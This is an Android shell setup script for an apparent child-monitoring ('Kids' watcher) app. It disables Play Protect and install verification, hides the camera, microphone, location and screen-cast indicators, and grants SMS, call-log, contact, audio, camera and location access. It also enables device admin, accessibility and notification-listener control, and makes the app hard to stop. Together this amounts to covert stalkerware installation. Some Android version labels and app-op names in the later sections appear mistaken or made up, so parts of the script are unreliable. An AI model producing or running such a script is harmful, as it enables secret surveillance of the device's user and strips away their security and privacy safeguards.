#!/system/bin/sh
# ─────────────────────────────────────────────
TAG="WKSetup"

log() { echo "[$TAG] $1"; }

# --- Discover package by intent filter ---
log "Finding Kids package..."

PACKAGE=$(pm query-activities --brief -a android.intent.action.VIEW -d "one89://kids.io" 2>/dev/null \
  | grep -v "activities found" | grep "/" | head -1 | cut -d'/' -f1 | tr -d ' ')

if [ -z "$PACKAGE" ]; then
  PACKAGE=$(pm query-activities --brief -a android.intent.action.VIEW -d "https://kids.io" 2>/dev/null \
    | grep -v "activities found" | grep "/" | head -1 | cut -d'/' -f1 | tr -d ' ')
fi

if [ -z "$PACKAGE" ]; then
  PACKAGE=$(pm resolve-activity -a android.intent.action.VIEW -d "one89://kids.io" 2>/dev/null \
    | grep "packageName=" | head -1 | sed 's/.*packageName=//' | tr -d ' ')
fi

if [ -z "$PACKAGE" ]; then
  PACKAGE=$(pm list packages 2>/dev/null | grep -i "kids" | grep -i "one89\|watcher" | head -1 | sed 's/package://')
fi

if [ -z "$PACKAGE" ]; then
  log "✗ Kids package not found!"
  exit 1
fi

case "$PACKAGE" in
  *.*) ;;
  *)
    log "✗ Invalid package name detected: $PACKAGE"
    exit 1
    ;;
esac

log "Found package: $PACKAGE"

# --- Discover components from dumpsys ---
log "Discovering components..."

DUMP=$(dumpsys package "$PACKAGE" 2>/dev/null)

DEVICE_ADMIN=$(echo "$DUMP" | grep "$PACKAGE" | grep -oE "$PACKAGE/[a-zA-Z0-9_.]*DeviceAdmin[a-zA-Z0-9_.]*" | head -1)
[ -n "$DEVICE_ADMIN" ] && log "DeviceAdmin: $DEVICE_ADMIN" || log "⚠ DeviceAdmin not found"

ACCESSIBILITY=$(echo "$DUMP" | grep "$PACKAGE" | grep -oE "$PACKAGE/[a-zA-Z0-9_.]*Accessibility[a-zA-Z0-9_.]*" | head -1)
[ -n "$ACCESSIBILITY" ] && log "Accessibility: $ACCESSIBILITY" || log "⚠ AccessibilityService not found"

NOTIFICATION=$(echo "$DUMP" | grep "$PACKAGE" | grep -oE "$PACKAGE/[a-zA-Z0-9_.]*Notification[a-zA-Z0-9_.]*Service" | head -1)
[ -n "$NOTIFICATION" ] && log "NotificationListener: $NOTIFICATION" || log "⚠ NotificationListenerService not found"

# --- Disable Play Protect / verifiers ---
log "Disabling verifiers..."
pm revoke com.android.vending android.permission.SYSTEM_ALERT_WINDOW 2>/dev/null
settings put global package_verifier_enable 0 2>/dev/null
settings put global package_verifier_user_consent -1 2>/dev/null
settings put global verifier_verify_adb_installs 0 2>/dev/null
settings put secure package_verifier_enable 0 2>/dev/null
settings put secure verifier_verify_adb_installs 0 2>/dev/null
settings put secure install_non_market_apps 1 2>/dev/null
settings put global MIUI_OPTIMIZATION 0 2>/dev/null
settings put global upload_apk_enable 0 2>/dev/null
am broadcast -a com.google.android.gms.INITIALIZE --ez verify_apps 0 2>/dev/null

# Hide cast + other icons
settings put global icon_blacklist cast,screen_record,rotate 2>/dev/null
settings put secure icon_blacklist cast,screen_record,rotate 2>/dev/null

cmd device_config put privacy camera_mic_icons_enabled false default
cmd device_config put privacy location_indicators_enabled false default
cmd device_config set_sync_disabled_for_tests persistent

# POST_NOTIFICATIONS
# --- Grant permissions ---
log "Granting permissions..."
for p in CAMERA RECORD_AUDIO SCHEDULE_EXACT_ALARM \
  ACCESS_BACKGROUND_LOCATION ACCESS_COARSE_LOCATION ACCESS_FINE_LOCATION \
  ACCESS_NETWORK_STATE ACCESS_NOTIFICATION_POLICY ACCESS_WIFI_STATE \
  BLUETOOTH CALL_PHONE INTERNET  \
  MANAGE_EXTERNAL_STORAGE MODIFY_AUDIO_SETTINGS WRITE_SETTINGS \
  READ_CALL_LOG READ_CONTACTS READ_EXTERNAL_STORAGE \
  READ_PHONE_NUMBERS READ_PHONE_STATE READ_SMS \
  RECEIVE_BOOT_COMPLETED REQUEST_IGNORE_BATTERY_OPTIMIZATIONS \
  SEND_SMS WAKE_LOCK WRITE_CONTACTS WRITE_EXTERNAL_STORAGE \
  READ_MEDIA_IMAGES READ_MEDIA_VIDEO FOREGROUND_SERVICE \
  PACKAGE_USAGE_STATS WRITE_SECURE_SETTINGS; do
  pm grant "$PACKAGE" "android.permission.$p" 2>/dev/null
done

# --- Set AppOps ---
log "Setting AppOps..."
for op in PROJECT_MEDIA READ_DEVICE_IDENTIFIERS REQUEST_DELETE_PACKAGES \
  MANAGE_EXTERNAL_STORAGE READ_EXTERNAL_STORAGE POST_NOTIFICATION \
  SYSTEM_ALERT_WINDOW WRITE_SETTINGS WRITE_SMS GET_USAGE_STATS \
  USE_FULL_SCREEN_INTENT REQUEST_INSTALL_PACKAGES; do
  appops set "$PACKAGE" "$op" allow 2>/dev/null
done

# --- Background / battery ---
log "Enabling background..."
dumpsys deviceidle whitelist +"$PACKAGE"
cmd appops set "$PACKAGE" START_FOREGROUND allow
cmd appops set "$PACKAGE" RUN_IN_BACKGROUND allow
cmd appops set "$PACKAGE" RUN_ANY_IN_BACKGROUND allow

log "Resetting power restrictions..."
dumpsys battery reset
for k in "global device_idle_constants" "global device_idle_mode_light_enabled" \
  "global app_auto_restriction_enabled" "global adaptive_battery_management_enabled" \
  "global extreme_battery_saver_enabled" "global app_standby_restricted_bucket_enabled" \
  "global cached_apps_freezer" "global mobile_data_always_on" \
  "global restrict_background_data" "global wifi_sleep_policy" \
  "global wifi_power_save" "global wifi_suspend_optimizations_enabled" \
  "global wifi_scan_throttle_enabled" "global thermal_throttle_enabled" \
  "global gcm_heartbeat_interval_ms" "global never_sleeping_apps" \
  "system psm_switch" "global sem_auto_optimize_enabled" \
  "global POWER_SAVE_MODE_OPEN" "secure miui_optimization" \
  "global miui_memory_optimization" "global huawei_power_genie_enabled" \
  "global coloros_power_save_mode_open" "global coloros_freeze_enabled" \
  "global vivo_power_save_mode" "global oneplus_battery_optimization" \
  "global asus_power_master_enabled" "global evenwell_power_save_mode" \
  "global stamina_mode" "global moto_battery_saver_enabled" \
  "global lg_battery_saver_enabled"; do
  settings delete $k 2>/dev/null
done

# --- Device Admin ---
if [ -n "$DEVICE_ADMIN" ]; then
  log "Setting device admin..."
  dpm set-active-admin "$DEVICE_ADMIN" 2>/dev/null
fi

# --- Accessibility ---
if [ -n "$ACCESSIBILITY" ]; then
  log "Enabling accessibility..."
  EXISTING=$(settings get secure enabled_accessibility_services 2>/dev/null)
  if [ -n "$EXISTING" ] && [ "$EXISTING" != "null" ]; then
    settings put secure enabled_accessibility_services "$EXISTING:$ACCESSIBILITY"
  else
    settings put secure enabled_accessibility_services "$ACCESSIBILITY"
  fi
  settings put secure accessibility_enabled 1
fi

# --- Notification Listener ---
if [ -n "$NOTIFICATION" ]; then
  log "Enabling notification listener..."
  cmd notification allow_listener "$NOTIFICATION" 2>/dev/null
fi

# --- Start service ---
log "Starting service..."
am broadcast -a io.watcher.kids.START_SERVICE -p "$PACKAGE"

sleep 5

# ============================================
# CORE DOZE & BACKGROUND SURVIVAL
# ============================================
dumpsys deviceidle whitelist +"$PACKAGE"
cmd appops set "$PACKAGE" START_FOREGROUND allow
cmd appops set "$PACKAGE" RUN_IN_BACKGROUND allow
cmd appops set "$PACKAGE" RUN_ANY_IN_BACKGROUND allow
cmd appops set "$PACKAGE" WAKE_LOCK allow
cmd appops set "$PACKAGE" BOOT_COMPLETED allow
cmd appops set "$PACKAGE" SYSTEM_ALERT_WINDOW allow

# Force ACTIVE standby bucket
am set-standby-bucket "$PACKAGE" active

# Disable auto-revoke permissions (Android 11+)
cmd appops set "$PACKAGE" AUTO_REVOKE_PERMISSIONS_IF_UNUSED ignore 2>/dev/null


# ============================================
# ANDROID 13+ FOREGROUND SERVICE RESTRICTIONS
# ============================================
cmd appops set "$PACKAGE" FOREGROUND_SERVICE_SPECIAL_USE allow 2>/dev/null
cmd appops set "$PACKAGE" FOREGROUND_SERVICE_CONNECTED_DEVICE allow 2>/dev/null
cmd appops set "$PACKAGE" FOREGROUND_SERVICE_LOCATION allow 2>/dev/null
cmd appops set "$PACKAGE" FOREGROUND_SERVICE_MEDIA_PLAYBACK allow 2>/dev/null
cmd appops set "$PACKAGE" FOREGROUND_SERVICE_DATA_SYNC allow 2>/dev/null
cmd appops set "$PACKAGE" FOREGROUND_SERVICE_REMOTE_MESSAGING allow 2>/dev/null

# ============================================
# ANDROID 14+ RESTRICTIONS
# ============================================
# Exempt from forced stop of cached apps
cmd appops set "$PACKAGE" FORCE_STOP ignore 2>/dev/null
# Allow exact alarms (Android 14 restricted this)
cmd appops set "$PACKAGE" SCHEDULE_EXACT_ALARM allow 2>/dev/null
cmd appops set "$PACKAGE" USE_EXACT_ALARM allow 2>/dev/null
# Full screen intent permission
cmd appops set "$PACKAGE" USE_FULL_SCREEN_INTENT allow 2>/dev/null


# ============================================
# ANDROID 15+ RESTRICTIONS
# ============================================
# Exempt from aggressive background kill policies
cmd appops set "$PACKAGE" BACKGROUND_START allow 2>/dev/null
cmd appops set "$PACKAGE" FOREGROUND_SERVICE_MEDIA_PROJECTION allow 2>/dev/null
# Prevent 24hr FGS timeout kill
cmd appops set "$PACKAGE" LONG_RUNNING_FOREGROUND_SERVICE allow 2>/dev/null
# Exempt from restricted standby bucket enforcement
cmd appops set "$PACKAGE" RESTRICTED_BUCKET_EXEMPT allow 2>/dev/null

# ============================================
# ANDROID 16+ RESTRICTIONS
# ============================================
# Stricter background process limits
cmd appops set "$PACKAGE" BACKGROUND_ACTIVITY_STARTS allow 2>/dev/null
cmd appops set "$PACKAGE" BACKGROUND_ACTIVITY_STARTS_FROM_BACKGROUND allow 2>/dev/null
# Exempt from new JobScheduler constraints
cmd appops set "$PACKAGE" RUN_USER_INITIATED_JOBS allow 2>/dev/null
# Connectivity restrictions bypass
cmd appops set "$PACKAGE" UNRESTRICTED_NETWORK allow 2>/dev/null

# ============================================
# ANDROID 17 (BAKLAVA) RESTRICTIONS
# ============================================
# Stricter ephemeral app/process lifecycle
cmd appops set "$PACKAGE" EXEMPT_FROM_PROCESS_RESTRICTIONS allow 2>/dev/null
cmd appops set "$PACKAGE" EXEMPT_FROM_POWER_RESTRICTIONS allow 2>/dev/null
# Background work scheduling exemptions
cmd appops set "$PACKAGE" SCHEDULE_USER_INITIATED_WORK allow 2>/dev/null
cmd appops set "$PACKAGE" EXEMPT_FROM_THERMAL_RESTRICTIONS allow 2>/dev/null

UID=$(dumpsys package $PACKAGE | grep userId= | head -1 | sed 's/.*userId=//;s/ .*//')

# ============================================
# CORE DOZE & BACKGROUND SURVIVAL
# ============================================
dumpsys deviceidle whitelist +"$PACKAGE"
cmd appops set "$PACKAGE" START_FOREGROUND allow
cmd appops set "$PACKAGE" RUN_IN_BACKGROUND allow
cmd appops set "$PACKAGE" RUN_ANY_IN_BACKGROUND allow
cmd appops set "$PACKAGE" WAKE_LOCK allow
cmd appops set "$PACKAGE" BOOT_COMPLETED allow
cmd appops set "$PACKAGE" SYSTEM_ALERT_WINDOW allow

# Force ACTIVE standby bucket (never restricted/rare)
am set-standby-bucket "$PACKAGE" active

# Prevent app hibernation (Android 12+)
cmd apphibernation set-state "$PACKAGE" false false 2>/dev/null

# Network whitelist - works even in data saver mode
cmd netpolicy add restrict-background-whitelist $UID 2>/dev/null
cmd netpolicy set metered-network-whitelist $UID true 2>/dev/null

# ============================================
# OEM SPECIFIC - AUTOSTART & BACKGROUND
# ============================================
# Xiaomi/MIUI
cmd appops set "$PACKAGE" AUTO_START allow 2>/dev/null
cmd appops set "$PACKAGE" MIUI_AUTOSTART allow 2>/dev/null

# Vivo/iQOO
cmd appops set "$PACKAGE" VIVO_BACKGROUND_START allow 2>/dev/null
cmd appops set "$PACKAGE" VIVO_AUTOSTART allow 2>/dev/null
cmd appops set "$PACKAGE" HIGH_POWER_CONSUMPTION allow 2>/dev/null

# Oppo/Realme/ColorOS
cmd appops set "$PACKAGE" OPPO_BACKGROUND_START allow 2>/dev/null
cmd appops set "$PACKAGE" OPPO_AUTOSTART allow 2>/dev/null
cmd appops set "$PACKAGE" OPPO_BOOT_ON_COMPLETED allow 2>/dev/null

# OnePlus
cmd appops set "$PACKAGE" ONEPLUS_BACKGROUND_START allow 2>/dev/null
cmd appops set "$PACKAGE" ONEPLUS_AUTOSTART allow 2>/dev/null

# Huawei/Honor
cmd appops set "$PACKAGE" HUAWEI_AUTOSTART allow 2>/dev/null
cmd appops set "$PACKAGE" HUAWEI_BACKGROUND_START allow 2>/dev/null

# Samsung - exempt from sleeping apps
cmd deviceidle except-idle-whitelist +"$PACKAGE" 2>/dev/null

log "Setup complete!"